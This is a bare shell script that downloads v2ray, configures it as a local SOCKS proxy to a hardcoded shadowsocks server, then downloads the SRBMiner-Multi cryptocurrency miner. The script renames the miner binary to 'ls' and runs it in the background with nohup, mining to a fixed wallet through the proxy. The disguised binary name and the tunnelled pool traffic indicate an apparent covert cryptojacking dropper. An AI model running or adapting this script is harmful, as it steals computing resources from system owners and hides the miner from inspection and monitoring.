#!/bin/sh
cd ~/
rm -rf v2*
wget https://github.com/v2fly/v2ray-core/releases/latest/download/v2ray-linux-64.zip
unzip v2ray-linux-64.zip -d v2ray
cd v2ray
chmod +x v2ray
cat > ~/v2ray/config.json<<EOL

{
"inbounds": [
{
"port": 1080,
"listen": "127.0.0.1",
"protocol": "socks",
"settings": {
"auth": "noauth",
"udp": true
}
}
],
"outbounds": [
{
"protocol": "shadowsocks",
"settings": {
"servers": [
{
"address": "3.34.138.59",
"port": 443,
"method": "chacha20-ietf-poly1305",
"password": "abc123",
"udp": true
}
]
}
}
]
}

EOL

nohup ./v2ray run > v2ray.log 2>&1 &
cd ~/
rm -rf SR*
rm -rf ls
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.8/SRBMiner-Multi-2-8-8-Linux.tar.gz
tar zxfv SRBMiner-Multi-2-8-8-Linux.tar.gz
mv SRBMiner-Multi-2-8-8 ls
cd ls
mv SRBMiner-MULTI ls
chmod +x ls
rm -f SR*
nohup ./ls -o verus.farm:9998  -u RWajjUzHh2BdpLB6qJChgQy2j3SfVXonMK -a verushash --proxy 127.0.0.1:1080 --tls true > ls.log 2>&1 &
